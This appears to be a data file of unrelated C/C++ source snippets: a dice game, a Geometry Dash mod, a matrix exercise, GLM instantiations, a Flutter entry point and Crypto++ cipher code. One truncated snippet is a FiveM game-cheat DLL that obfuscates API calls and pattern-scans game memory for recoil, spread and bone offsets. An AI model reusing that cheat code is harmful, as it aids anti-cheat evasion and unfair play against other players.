    "#include <iostream>\n#include <conio.h>\n#include <ctime>\nusing namespace std;\n\nint main()\n{\n\tstring name;\n\tint money = 100;\n\tint bid;\n\tstring command;\n\tbool registrated, newtry, played;\n\tint wins, losses;\n\tint diceval;\n\t\n\twhile (1) {\n\t\tif (!registrated) {\n\t\t\tcout << \"Enter your nickname: \";\n\t\t\tcin >> name;\n\t\t\tcout << \"\\nWelcome to eter dice, \" + name + \".\" << endl;\n\t\t}\n\t\t\n\t\tregistrated = 1;\n\t\tplayed = 0;\n\t\tcout << \"\\n------Commands------\\n\" << \"   1. New bid\\n\" << \"   2. Info\\n\" << \"   3. Clear screen\\n\";\n\t\tcout << \"\\n>>> \";\n\t\tcin >> command;\n\t\tif (command == \"1\") {\n\t\t\twhile (!played) {\n\t\t\t\tif (!newtry) {\n\t\t\t\t\tcout << \"\\n------Dice options------\" << endl;\n\t\t\t\t\tcout << \"Bid: \";\n\t\t\t\t\tcin >> bid;\n\t\t\t\t\tif (bid > money || bid == 0)\n\t\t\t\t\t\tnewtry = 1;\n\t\t\t\t} else {\n\t\t\t\t\tcout << \"\\nEnough money, enter a new bid: \";\n\t\t\t\t\tcin >> bid;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n\t\t\t\tif (bid < money + 1) {\n\t\t\t\t\tnewtry = 0;\n\t\t\t\t\t\n\t\t\t\t\tif (!newtry && diceval == 0) {\n\t\t\t\t\t\tcout << \"\\nEnter dice value: \";\n\t\t\t\t\t\tcin >> diceval;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tif (diceval > 6) {\n\t\t\t\t\t\tnewtry = 1;\n\t\t\t\t\t\twhile (newtry) {\n\t\t\t\t\t\t\tcout << \"Enter a new dice value: \";\n\t\t\t\t\t\t\tcin >> diceval;\n\t\t\t\t\t\t\tif (diceval < 7)\n\t\t\t\t\t\t\t\tnewtry = 0;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tsrand(time(0));\n\t\t\t\t\tint random = rand() % 7;\n\t\t\t\t\tif (diceval == random) {\n\t\t\t\t\t\tcout << \"You win 2x money!\\n\";\n\t\t\t\t\t\tcout << \"Random value is \" + to_string(random) + \"\\n\";\n\t\t\t\t\t\tmoney += bid;\n\t\t\t\t\t\twins++;\n\t\t\t\t\t\tnewtry = 0;\n\t\t\t\t\t\tdiceval = 0;\n\t\t\t\t\t\tbid = 0;\n\t\t\t\t\t\tplayed = 1;\n\t\t\t\t\t\t\n\t\t\t\t\t} else {\n\t\t\t\t\t\tcout << \"You lose money!\\n\";\n\t\t\t\t\t\tcout << \"Random value is \" + to_string(random) + \"\\n\";\n\t\t\t\t\t\tmoney = money - bid;\n\t\t\t\t\t\tlosses++;\n\t\t\t\t\t\tnewtry = 0;\n\t\t\t\t\t\tdiceval = 0;\n\t\t\t\t\t\tbid = 0;\n\t\t\t\t\t\tplayed = 1;\n\t\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (command == \"2\") {\n\t\t\tcout << \"\\n------INFO------\" << endl;\n\t\t\tcout << \"Name: \" + name << endl;\n\t\t\tcout << \"Balance: \" + to_string(money) + \"$\" << endl;\n\t\t\tcout << \"Wins: \" + to_string(wins) << endl;\n\t\t\tcout << \"Losses: \" + to_string(losses) << endl;\n\t\t}\n\t\tif (command == \"3\") clrscr();\n\t\tif (command == \"t.me/eterniumgg\") {\n\t\t\tmoney += 999999; \n\t\t\tcout << \"\\ngood cheatcode\";\n\t\t}\n\t}\n}",
    "#include <Geode/Geode.hpp>\n#include <Geode/utils/web.hpp>\n#include <Geode/modify/MenuLayer.hpp>\n\nusing namespace geode::prelude;\n\nint mrrow = 0;\n\nclass $modify (MrrpMrrow, MenuLayer)\n{\n\tstruct Fields\n\t{\n        EventListener<web::WebTask> listener;\n        EventListener<web::WebTask> listener2;\n\t\tLoadingCircle* lcircle;\n\t\tCCLayerColor* bg;\n    };\n\n\tbool init()\n\t{\n\t\tif (!MenuLayer::init())\n\t\t\treturn false;\n\t\t\n\t\tauto myButton = CCMenuItemSpriteExtra::create(\n\t\t\tCCSprite::createWithSpriteFrameName(\"GJ_likeBtn_001.png\"),\n\t\t\tthis,\n\t\t\tmenu_selector(MrrpMrrow::onMeow)\n\t\t);\n\n\t\tauto menu = this->getChildByID(\"bottom-menu\");\n\t\tmenu->addChild(myButton);\n\n\t\tmyButton->setID(\"my-button\"_spr);\n\n\t\tmenu->updateLayout();\n\n\t\treturn true;\n\t}\n\n\tvoid onMeow(CCObject*)\n\t{\n\t\tif (!m_fields->lcircle)\n\t\t{\n\t\t\tauto circle = LoadingCircle::create();\n\t\t\tcircle->show();\n\n\t\t\tauto bg = CCLayerColor::create(ccc4(0, 0, 0, 0));\n\t\t\tbg->runAction(CCFadeTo::create(0.5f, 100));\n\n\t\t\tcircle->addChild(bg, -1);\n\n\t\t\tm_fields->lcircle = circle;\n\t\t\tm_fields->bg = bg;\n\t\t}\n\n\t\tm_fields->listener2.bind([this] (web::WebTask::Event* e)\n\t\t{\n            if (web::WebResponse* res = e->getValue()) {\n                if (res->ok()) {\n                    auto imgData = res->data();\n                    auto image = Ref(new CCImage());\n                    image->initWithImageData(const_cast<uint8_t*>(res->data().data()),res->data().size());\n                    std::string theKey = fmt::format(\"{}/logo-{}\", Mod::get()->getID(), mrrow);\n                    auto texture = CCTextureCache::get()->addUIImage(image,theKey.c_str());\n                    image->release();\n\n\t\t\t\t\tauto spr = CCSprite::createWithTexture(texture);\n\t\t\t\t\tspr->setPosition(this->getContentSize() / 2);\n\t\t\t\t\tlimitNodeSize(spr, ccp(250, 250), 1, 0);\n\t\t\t\t\tthis->addChild(spr, 420);\n\n\t\t\t\t\tmrrow++;\n                }\n            }\n\t\t\telse if (e->isCancelled()) {\n                log::info(\"The request was cancelled... So sad :(\");\n                this->release();\n            }\n\t\t\telse if (e->getProgress())\n\t\t\t{\n\t\t\t\tlog::info(\"nyaaaaaaaaaaa: {}\", e->getProgress()->downloadProgress().value_or(0));\n\t\t\t}\n        });\n\n\t\tm_fields->listener.bind([this] (web::WebTask::Event* e)\n\t\t{\n            if (web::WebResponse* res = e->getValue()) {\n                if (res->ok()) {\n\t\t\t\t\tlog::info(\"str: {}\", res->string().unwrapOr(\"mrrow\"));\n\n                    auto json = res->json().unwrapOr(\"{}\");\n\n\t\t\t\t\tauto results = json[\"results\"].as_array();\n\t\t\t\t\tauto data = results.at(0).as_object();\n\t\t\t\t\tauto url = data[\"url\"].as_string();\n\n\t\t\t\t\tlog::info(\"url: {}\", url);\n\n\t\t\t\t\tauto req = web::WebRequest();\n        \t\t\tm_fields->listener2.setFilter(req.get(url));\n                }\n            } else if (e->isCancelled()) {\n                log::info(\"The request was cancelled... So sad :(\");\n                this->release();\n            }\n        });\n\n        auto req = web::WebRequest();\n        m_fields->listener.setFilter(req.get(\"https://nekos.best/api/v2/neko\"));\n\t}\n};\n",
    "// program to check whether two matrices are equal or not\n#include <stdio.h>\n#define SIZE 3 // Matrix size\nint main()\n{\n\tint A[SIZE][SIZE];\n\tint B[SIZE][SIZE];\n\tint row, col, isEqual;\n\n\t/* Input elements in first matrix from user */\n\tprintf(\"Enter elements in matrix A of size %d x %d: \\n\", SIZE, SIZE);\n\tfor (row = 0;row < SIZE;row++)\n\t{\n\t\tfor (col = 0;col < SIZE;col++)\n\t\t{\n\t\t\tscanf_s(\"%d\", &A[row][col]);\n\t\t}\n\t}\n\n\t/* Input elements in second matrix from user */\n\tprintf(\"\\nEnter elements in matrix B of size %d x %d: \\n\", SIZE, SIZE);\n\tfor (row = 0;row < SIZE;row++)\n\t{\n\t\tfor (col = 0;col < SIZE;col++)\n\t\t{\n\t\t\tscanf_s(\"%d\", &B[row][col]);\n\t\t}\n\t}\n\n\t/* Assumes that the matrices are equal */\n\tisEqual = 1;\n\tfor (row = 0;row < SIZE;row++)\n\t{\n\t\tfor (col = 0;col < SIZE;col++)\n\t\t{\n\t\t\t/*\n\t\t\t* If the corresponding entries of matrices are not equal\n\t\t\t*/\n\t\t\tif (A[row][col] != B[row][col])\n\t\t\t{\n\t\t\t\tisEqual = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\t/*\n\tChecks the value of isEqual\n\tAs per our assumption if isEqual contains 1 means both are equal\n\tIf it contains o means both are not equal\n\t*/\n\tif (isEqual == 1)\n\t{\n\t\tprintf(\"\\nMatrix A is equal to Matrix B\");\n\t}\n\telse\n\t{\n\t\tprintf(\"\\nMatrix A is not equal to Matrix B\");\n\t}\n\n\treturn 0;\n}",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"power_switch_button\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// square.cpp - written and placed in the public domain by Wei Dai\n// Based on Paulo S.L.M. Barreto's public domain implementation\n\n#include \"pch.h\"\n#include \"square.h\"\n#include \"misc.h\"\n#include \"gf256.h\"\n\nNAMESPACE_BEGIN(CryptoPP)\n\n// apply theta to a roundkey\nstatic void SquareTransform (word32 in[4], word32 out[4])\n{\n\tstatic const byte G[4][4] = \n\t{\n\t\t0x02U, 0x01U, 0x01U, 0x03U, \n\t\t0x03U, 0x02U, 0x01U, 0x01U, \n\t\t0x01U, 0x03U, 0x02U, 0x01U, \n\t\t0x01U, 0x01U, 0x03U, 0x02U\n\t};\n\n\tGF256 gf256(0xf5);\n\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tword32 temp = 0;\n\t\tfor (int j = 0; j < 4; j++)\n\t\t\tfor (int k = 0; k < 4; k++)\n\t\t\t\ttemp ^= (word32)gf256.Multiply(GETBYTE(in[i], 3-k), G[k][j]) << ((3-j)*8);\n\t\tout[i] = temp;\n\t}\n}\n\n#define roundkeys(i, j)\t\tm_roundkeys[(i)*4+(j)]\n#define roundkeys4(i)\t\t(m_roundkeys+(i)*4)\n\nvoid Square::Base::UncheckedSetKey(const byte *userKey, unsigned int length, const NameValuePairs &)\n{\n\tAssertValidKeyLength(length);\n\n\tstatic const word32 offset[ROUNDS] = {\n\t0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL,\n\t0x10000000UL, 0x20000000UL, 0x40000000UL, 0x80000000UL,\n\t};\n\n\tGetUserKey(BIG_ENDIAN_ORDER, m_roundkeys.data(), KEYLENGTH/4, userKey, KEYLENGTH);\n\n\t/* apply the key evolution function */\n\tfor (int i = 1; i < ROUNDS+1; i++)\n\t{\n\t\troundkeys(i, 0) = roundkeys(i-1, 0) ^ rotlFixed(roundkeys(i-1, 3), 8U) ^ offset[i-1];\n\t\troundkeys(i, 1) = roundkeys(i-1, 1) ^ roundkeys(i, 0);\n\t\troundkeys(i, 2) = roundkeys(i-1, 2) ^ roundkeys(i, 1);\n\t\troundkeys(i, 3) = roundkeys(i-1, 3) ^ roundkeys(i, 2);\n\t}  \n\n\t/* produce the round keys */\n\tif (IsForwardTransformation())\n\t{\n\t\tfor (int i = 0; i < ROUNDS; i++)\n\t\t\tSquareTransform (roundkeys4(i), roundkeys4(i));\n\t}\n\telse\n\t{\n\t\tfor (int i = 0; i < ROUNDS/2; i++)\n\t\t\tfor (int j = 0; j < 4; j++)\n\t\t\t\tstd::swap(roundkeys(i, j), roundkeys(ROUNDS-i, j));\n\t\tSquareTransform (roundkeys4(ROUNDS), roundkeys4(ROUNDS));\n\t}\n}\n\n#define MSB(x) (((x) >> 24) & 0xffU)\t/* most  significant byte */\n#define SSB(x) (((x) >> 16) & 0xffU)\t/* second in significance */\n#define TSB(x) (((x) >>  8) & 0xffU)\t/* third  in significance */\n#define LSB(x) (((x)      ) & 0xffU)\t/* least significant byte */\n\n#define squareRound(text, temp, T0, T1, T2, T3, roundkey) \\\n{ \\\n\ttemp[0] = T0[MSB (text[0])] \\\n\t\t\t^ T1[MSB (text[1])] \\\n\t\t\t^ T2[MSB (text[2])] \\\n\t\t\t^ T3[MSB (text[3])] \\\n\t\t\t^ roundkey[0]; \\\n\ttemp[1] = T0[SSB (text[0])] \\\n\t\t\t^ T1[SSB (text[1])] \\\n\t\t\t^ T2[SSB (text[2])] \\\n\t\t\t^ T3[SSB (text[3])] \\\n\t\t\t^ roundkey[1]; \\\n\ttemp[2] = T0[TSB (text[0])] \\\n\t\t\t^ T1[TSB (text[1])] \\\n\t\t\t^ T2[TSB (text[2])] \\\n\t\t\t^ T3[TSB (text[3])] \\\n\t\t\t^ roundkey[2]; \\\n\ttemp[3] = T0[LSB (text[0])] \\\n\t\t\t^ T1[LSB (text[1])] \\\n\t\t\t^ T2[LSB (text[2])] \\\n\t\t\t^ T3[LSB (text[3])] \\\n\t\t\t^ roundkey[3]; \\\n} /* squareRound */\n\n#define squareFinal(text, temp, S, roundkey) \\\n{ \\\n\ttext[0] = ((word32) (S[MSB (temp[0])]) << 24) \\\n\t\t\t^ ((word32) (S[MSB (temp[1])]) << 16) \\\n\t\t\t^ ((word32) (S[MSB (temp[2])]) <<  8) \\\n\t\t\t^  (word32) (S[MSB (temp[3])]) \\\n\t\t\t^ roundkey[0]; \\\n\ttext[1] = ((word32) (S[SSB (temp[0])]) << 24) \\\n\t\t\t^ ((word32) (S[SSB (temp[1])]) << 16) \\\n\t\t\t^ ((word32) (S[SSB (temp[2])]) <<  8) \\\n\t\t\t^  (word32) (S[SSB (temp[3])]) \\\n\t\t\t^ roundkey[1]; \\\n\ttext[2] = ((word32) (S[TSB (temp[0])]) << 24) \\\n\t\t\t^ ((word32) (S[TSB (temp[1])]) << 16) \\\n\t\t\t^ ((word32) (S[TSB (temp[2])]) <<  8) \\\n\t\t\t^  (word32) (S[TSB (temp[3])]) \\\n\t\t\t^ roundkey[2]; \\\n\ttext[3] = ((word32) (S[LSB (temp[0])]) << 24) \\\n\t\t\t^ ((word32) (S[LSB (temp[1])]) << 16) \\\n\t\t\t^ ((word32) (S[LSB (temp[2])]) <<  8) \\\n\t\t\t^  (word32) (S[LSB (temp[3])]) \\\n\t\t\t^ roundkey[3]; \\\n} /* squareFinal */\n\ntypedef BlockGetAndPut<word32, BigEndian> Block;\n\nvoid Square::Enc::ProcessAndXorBlock(const byte *inBlock, const byte *xorBlock, byte *outBlock) const\n{\n\tword32 text[4], temp[4];\n\tBlock::Get(inBlock)(text[0])(text[1])(text[2])(text[3]);\n   \n\t/* initial key addition */\n\ttext[0] ^= roundkeys(0, 0);\n\ttext[1] ^= roundkeys(0, 1);\n\ttext[2] ^= roundkeys(0, 2);\n\ttext[3] ^= roundkeys(0, 3);\n \n\t/* ROUNDS - 1 full rounds */\n\tfor (int i=1; i+1<ROUNDS; i+=2)\n\t{\n\t\tsquareRound (text, temp, Te[0], Te[1], Te[2], Te[3], roundkeys4(i));\n\t\tsquareRound (temp, text, Te[0], Te[1], Te[2], Te[3], 